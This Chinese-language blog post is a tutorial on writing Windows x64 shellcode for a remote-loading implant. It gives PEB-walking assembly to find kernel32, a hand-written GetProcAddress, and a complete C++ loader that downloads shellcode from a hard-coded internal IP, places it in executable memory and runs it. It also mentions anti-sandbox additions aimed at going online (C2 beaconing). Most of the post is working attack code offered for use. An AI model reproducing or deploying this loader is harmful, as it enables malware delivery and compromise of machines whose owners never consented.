<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> shellcode编写 · 季伯常  Blog</title><meta name="description" content="shellcode编写 - null"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="https://www.jibochang.link/atom.xml" title="季伯常  Blog"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="季伯常  Blog" type="application/atom+xml">
</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">shellcode编写</h1><div class="post-info">Aug 24, 2024</div><div class="post-content"><p>上一篇文章中讲了如何patch，没讲如何写上线的shellcode，本文就简单记录一下如何编写一个远程加载的shellcode</p>
<h3 id="什么是shellcode"><a href="#什么是shellcode" class="headerlink" title="什么是shellcode"></a>什么是shellcode</h3><p>shellcode是指不依赖环境，放到任何地方都可以执行的机器码。编写shellcode需要注意如下事项：</p>
<ol>
<li>不能有全局变量，因为shellcode不依赖环境，放到其他程序中执行不一定会有这个全局变量</li>
<li>不能使用常量字符串，也就是类似于”abc”这样的字符串，需要通过数组定义字符串，例如<code>char string[] = &#123;&#39;a&#39;, &#39;b&#39;, &#39;c&#39;&#125;;</code> 或者<code>char string[] = &#123;0x61, 0x62, 0x63&#125;;  </code>这是因为双引号字符串编译器会优先存放在常量区中，其他程序不一定有这样一个常量区；而使用数组定义字符串，数据会直接放到堆栈中，不依赖外部环境。</li>
<li>函数、导入表不使用绝对地址，因为系统不会每次都把DLL文件加载到相同地址上，而且DLL文件可能随着Windows每次新发布的更新而发生变化，所以不能依赖DLL文件中某个函数特定的偏移。shellcode需要在调用函数时，先用LoadLibrary把函数所属的DLL文件加载到内存，然后通过GetProcAddress查找所需要的函数地址，通过这个地址进行函数调用。</li>
<li>避免空字节，空字节被认为是字符串的结束符。</li>
</ol>
<hr>
<p>因为函数不能直接使用，所以需要动态加载获取函数地址，动态加载使用<code>GetProcAddress</code>函数，接着用<code>GetProcAddress</code>去获取kernel32中<code>LoadLibrary</code>和<code>GetProcAddress</code>，接着用这两个函数就能获取任意函数地址进行调用了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.查找PEB获取kernel32基地址</span><br><span class="line">2.通过自实现的GetProcAddress去查找kernel32中的LoadLibrary和GetProcAddress</span><br><span class="line">3.接着用LoadLibrary和GetProcAddress去加载各种dll中的函数</span><br></pre></td></tr></table></figure>



<h3 id="kernel32基址查找"><a href="#kernel32基址查找" class="headerlink" title="kernel32基址查找"></a>kernel32基址查找</h3><p>由于<code>LoadLibrary</code>在kernel32中，所以我们要先获取kernel32的地址，才能去加载，这里是通过peb查找，具体这里不细说</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GetModuleKernel proc</span><br><span class="line">	xor r8, r8</span><br><span class="line">	xor rax, rax</span><br><span class="line">	xor r10, r10</span><br><span class="line">	add r10, 60h</span><br><span class="line">	mov rax, gs:[r10]     ;通过GS寄存器获取PEB基址</span><br><span class="line">	mov rax, [rax + 18h]  ;获取PEB中Ldr数据结构的基址</span><br><span class="line">	mov rax, [rax + 10h]  ;获取Ldr数据结构的InmemoryOrderModuleList字段的基址</span><br><span class="line">	mov rax, [rax]		   ;获取InmemoryOrderModuleList链表第一个节点 用这个取就是ntdll的基址</span><br><span class="line">	mov rax, [rax]		   ;获取InmemoryOrderModuleList链表第一个节点  用这个就是kernen32的基址</span><br><span class="line">	mov rax, [rax + 30h]  ;获取节点中BaseAddress字段，既kernel32.dll的基址</span><br><span class="line">	ret</span><br><span class="line">GetModuleKernel endp</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="自实现GetProcAddress"><a href="#自实现GetProcAddress" class="headerlink" title="自实现GetProcAddress"></a>自实现GetProcAddress</h3><p>接着需要实现一下<code>GetProcAddress</code>，这里主要是用来查找<code>GetProcAddress</code>和<code>LoadLibrary</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">FARPROC MyGetProcAddress(HMODULE hModule, char* lpProcName) &#123;</span><br><span class="line">	IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)hModule;</span><br><span class="line">	IMAGE_NT_HEADERS64* pNtHeaders = (IMAGE_NT_HEADERS64*)((char*)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">	//LPVOID exports1 = (LPVOID)&amp;(pNtHeaders-&gt;OptionalHeader.DataDirectory[0]);</span><br><span class="line">	//DWORD exports2 =  pNtHeaders-&gt;OptionalHeader.DataDirectory[0].VirtualAddress;</span><br><span class="line"></span><br><span class="line">	IMAGE_EXPORT_DIRECTORY* pExportDir = (IMAGE_EXPORT_DIRECTORY*)((char*)pDosHeader + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line"></span><br><span class="line">	DWORD* pAddressOfNames = (DWORD*)((char*)pDosHeader + pExportDir-&gt;AddressOfNames);</span><br><span class="line">	WORD* pAddressOfOrdinals = (WORD*)((char*)pDosHeader + pExportDir-&gt;AddressOfNameOrdinals);</span><br><span class="line">	DWORD* pAddressOfFunctions = (DWORD*)((char*)pDosHeader + pExportDir-&gt;AddressOfFunctions);</span><br><span class="line"></span><br><span class="line">	for (DWORD i = 0; i &lt; pExportDir-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">		LPCSTR pProcName = (LPCSTR)((char*)pDosHeader + pAddressOfNames[i]);</span><br><span class="line">		if (MyStrCmp((char*)pProcName, lpProcName) == 0) &#123;</span><br><span class="line">			WORD ordinal = pAddressOfOrdinals[i];</span><br><span class="line">			DWORD functionRVA = pAddressOfFunctions[ordinal];</span><br><span class="line">			FARPROC functionPtr = (FARPROC)((char*)hModule + functionRVA);</span><br><span class="line">			return functionPtr;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的是32位和64位的PE结构有些不同，所以不通用，上面的64位的</p>
<h3 id="项目设置"><a href="#项目设置" class="headerlink" title="项目设置"></a>项目设置</h3><p>接着就是需要设置一下项目的选项(VS2022)</p>
<ol>
<li>项目设置Release，测试可以用Debug测试</li>
<li>修改入口函数，在项目属性-&gt;链接器-&gt;高级-&gt;入口点</li>
<li>接着就是一些优化处理</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">属性 → C/C++ → 代码生成 → 安全检查 → 禁用安全检查</span><br><span class="line">属性 → C/C++ → 代码生成 → 运行库 → 多线程(/MT)</span><br><span class="line">属性 → C/C++ → 优化 → 已禁用</span><br><span class="line">属性 → 链接器 → 清单文件 → 生成清单文件 → 否</span><br><span class="line">属性 → 链接器 → 调试 → 生成调试信息 → 否</span><br></pre></td></tr></table></figure>

<p>由于64位不能使用内联汇编，因此需要新建一个asm文件，然后项目右键-&gt;生成依赖，勾选上masm</p>
<p><img src="/2024/08/24/%E7%BC%96%E5%86%99%E8%87%AA%E5%AE%9A%E4%B9%89shellcode/image-20240824181300309.png" alt="image-20240824181300309"></p>
<p>接着对asm文件右键-&gt;属性，选择项类型Microsoft Macro Assembler，从生成中排除否</p>
<p><img src="/2024/08/24/%E7%BC%96%E5%86%99%E8%87%AA%E5%AE%9A%E4%B9%89shellcode/image-20240824181345214.png" alt="image-20240824181345214"></p>
<p>推荐使用网上的shellcode模板，这里推荐两个<a target="_blank" rel="noopener" href="https://github.com/clownfive/CppDevShellcode/">CppDevShellcode</a>和<a target="_blank" rel="noopener" href="https://github.com/yinsel/ShellcodeDev">ShellcodeDev</a>，本文基于CppDevShellcode编写</p>
<h2 id="Shellcode编写"><a href="#Shellcode编写" class="headerlink" title="Shellcode编写"></a>Shellcode编写</h2><p>上面都搞完之后就可以开始正式写shellcode了，这里可以看先一下网上常见的远程加载的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;wininet.h&gt;</span><br><span class="line">#pragma comment(lib, &quot;wininet.lib&quot;)</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;fstream&gt;</span><br><span class="line">#include &lt;sstream&gt;</span><br><span class="line">#include &lt;vector&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 将十六进制中的单个字符转换为相应的整数值</span><br><span class="line">unsigned char hexCharToByte(char character) &#123;</span><br><span class="line">    if (character &gt;= &#x27;0&#x27; &amp;&amp; character &lt;= &#x27;9&#x27;) &#123;</span><br><span class="line">        return character - &#x27;0&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    if (character &gt;= &#x27;a&#x27; &amp;&amp; character &lt;= &#x27;f&#x27;) &#123;</span><br><span class="line">        return character - &#x27;a&#x27; + 10;</span><br><span class="line">    &#125;</span><br><span class="line">    if (character &gt;= &#x27;A&#x27; &amp;&amp; character &lt;= &#x27;F&#x27;) &#123;</span><br><span class="line">        return character - &#x27;A&#x27; + 10;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 将十六进制字符串转换成字节型数组</span><br><span class="line">void hexStringToBytes(const std::string&amp; hexString, unsigned char* byteArray, int byteArraySize) &#123;</span><br><span class="line">    for (int i = 0; i &lt; hexString.length(); i += 2) &#123;</span><br><span class="line">        byteArray[i / 2] = hexCharToByte(hexString[i]) * 16 + hexCharToByte(hexString[i + 1]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 从指定的URL下载内容并将其存储到给定的缓冲区中。</span><br><span class="line"> *</span><br><span class="line"> * @param url 要下载的URL</span><br><span class="line"> * @param buffer 存储下载内容的缓冲区</span><br><span class="line"> * @return 下载的字节数（注意：字节数是原始十六进制字符串长度的一半）</span><br><span class="line"> */</span><br><span class="line">size_t GetUrl_HexContent(LPSTR url, std::vector&lt;unsigned char&gt;&amp; buffer) &#123;</span><br><span class="line">    HINTERNET hInternet, hConnect;</span><br><span class="line">    DWORD bytesRead;</span><br><span class="line">    DWORD bufferSize = 0;</span><br><span class="line">    DWORD contentLength = 0;</span><br><span class="line">    DWORD index = 0;</span><br><span class="line">    DWORD bufferLength = sizeof(bufferSize);</span><br><span class="line"></span><br><span class="line">    // 打开一个与互联网的连接</span><br><span class="line">    hInternet = InternetOpen(L&quot;User Agent&quot;, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);</span><br><span class="line">    if (hInternet == NULL) &#123;</span><br><span class="line">        std::cerr &lt;&lt; &quot;InternetOpen failed. Error: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 打开一个URL连接</span><br><span class="line">    hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);</span><br><span class="line">    if (hConnect == NULL) &#123;</span><br><span class="line">        std::cerr &lt;&lt; &quot;InternetOpenUrlA failed. Error: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">        InternetCloseHandle(hInternet);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 查询HTTP响应头中的内容长度</span><br><span class="line">    HttpQueryInfo(hConnect, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &amp;contentLength, &amp;bufferLength, &amp;index);</span><br><span class="line">    std::vector&lt;char&gt; hexBuffer(contentLength + 1, 0);</span><br><span class="line">    // 读取URL返回的内容到hexBuffer中</span><br><span class="line">    if (!InternetReadFile(hConnect, &amp;hexBuffer[0], contentLength, &amp;bytesRead)) &#123;</span><br><span class="line">        std::cerr &lt;&lt; &quot;InternetReadFile failed. Error: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (bytesRead &gt; 0) &#123;</span><br><span class="line">        hexBuffer[bytesRead] = &#x27;\0&#x27;;</span><br><span class="line">        // 调整buffer的大小，以便存储转换后的字节数据</span><br><span class="line">        buffer.resize(bytesRead / 2);</span><br><span class="line">        // 将十六进制字符串转换为字节型数组</span><br><span class="line">        hexStringToBytes(&amp;hexBuffer[0], &amp;buffer[0], bytesRead / 2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 关闭连接</span><br><span class="line">    InternetCloseHandle(hConnect);</span><br><span class="line">    InternetCloseHandle(hInternet);</span><br><span class="line"></span><br><span class="line">    // 返回读取到的字节数（注意：字节数是原始十六进制字符串长度的一半）</span><br><span class="line">    return bytesRead / 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    // 把这个URL换成你的shellcode文件的URL</span><br><span class="line">    LPSTR url = (char*)&quot;http://192.168.3.1:8088/sss.txt&quot;;</span><br><span class="line"></span><br><span class="line">    //存放恶意代码的数组</span><br><span class="line">    std::vector&lt;unsigned char&gt; buffer;</span><br><span class="line"></span><br><span class="line">    //获取远程url的16进制内容,并将其存放至buffer数组</span><br><span class="line">    size_t size = GetUrl_HexContent(url, buffer);</span><br><span class="line"></span><br><span class="line">    // 在内存中分配一块可以执行的区域</span><br><span class="line">    char* exec = (char*)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    // 将shellcode复制到该区域</span><br><span class="line">    memcpy(exec, buffer.data(), size);</span><br><span class="line"></span><br><span class="line">    // 执行该shellcode</span><br><span class="line">    ((void(*) ())exec)();</span><br><span class="line"></span><br><span class="line">     //打印buffer的内容，只为演示，实际使用中可能并不需要这一步</span><br><span class="line">    //for (size_t i = 0; i &lt; buffer.size(); i++) &#123;</span><br><span class="line">    //    printf(&quot;%02X &quot;, buffer[i]);</span><br><span class="line">    //    if ((i + 1) % 16 == 0) &#123;</span><br><span class="line">    //        printf(&quot;\n&quot;);</span><br><span class="line">    //    &#125;</span><br><span class="line">    //&#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码也不长，分析结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.远程读取服务器文件内容</span><br><span class="line">2.将十六进制转换成数组</span><br><span class="line">3.开辟一个可读可写可执行的内存空间，将读取的内容移动进去</span><br><span class="line">4.通过函数指针方式执行上线</span><br></pre></td></tr></table></figure>

<p>其中的十六进制转换可以去掉，保留其他步骤即可，第一步先要定义相关的函数</p>
<p><img src="/2024/08/24/%E7%BC%96%E5%86%99%E8%87%AA%E5%AE%9A%E4%B9%89shellcode/image-20240824192239014.png" alt="image-20240824192239014"></p>
<p><img src="/2024/08/24/%E7%BC%96%E5%86%99%E8%87%AA%E5%AE%9A%E4%B9%89shellcode/image-20240824192322146.png" alt="image-20240824192322146"></p>
<p>之后通过<code>GetProcAddress</code>和<code>LoadLibrary</code>去获取这些函数的地址</p>
<p><img src="/2024/08/24/%E7%BC%96%E5%86%99%E8%87%AA%E5%AE%9A%E4%B9%89shellcode/image-20240824192513614.png" alt="image-20240824192513614"></p>
<p>后面就可以按照上面的代码进行编写，写完之后就可以提取shellcode然后替换进去使用，可以添加一些反沙箱。但由于添加之后体积会变大，所以可以通过jump的方式跳转到另外一个函数去执行上线的shellcode。</p>
<p>最后展示一下效果</p>
<p><img src="/2024/08/24/%E7%BC%96%E5%86%99%E8%87%AA%E5%AE%9A%E4%B9%89shellcode/image-20240824193219980.png" alt="image-20240824193219980"></p>
<p><img src="/2024/08/24/%E7%BC%96%E5%86%99%E8%87%AA%E5%AE%9A%E4%B9%89shellcode/image-20240824193243037.png" alt="image-20240824193243037"></p>
<p><img src="/2024/08/24/%E7%BC%96%E5%86%99%E8%87%AA%E5%AE%9A%E4%B9%89shellcode/image-20240824193342569.png" alt="image-20240824193342569"></p>
<p><img src="/2024/08/24/%E7%BC%96%E5%86%99%E8%87%AA%E5%AE%9A%E4%B9%89shellcode/image-20240824193406900.png" alt="image-20240824193406900"></p>
</div></article></div></main><footer><div class="paginator"><a href="/2024/07/14/%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80%E4%B9%8Bpatch%E7%99%BD%E6%96%87%E4%BB%B6/" class="next">NEXT</a></div><div class="copyright"><p>© 2024 <a href="https://www.jibochang.link"></a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>